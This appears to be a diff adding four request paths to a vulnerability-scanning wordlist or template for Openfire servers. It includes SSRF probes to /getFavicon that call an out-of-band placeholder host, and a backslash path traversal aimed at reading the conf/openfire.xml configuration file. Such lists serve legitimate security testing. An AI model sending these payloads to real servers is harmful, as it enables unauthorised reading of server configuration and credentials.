@@ -1,0 +1,4 @@
+/getFavicon?host=http://{{interactsh-url}}/
+/getFavicon?host=http://{{interactsh-url}}
+/plugins/search/..\..\..\conf\openfire.xml
+/login.jsp
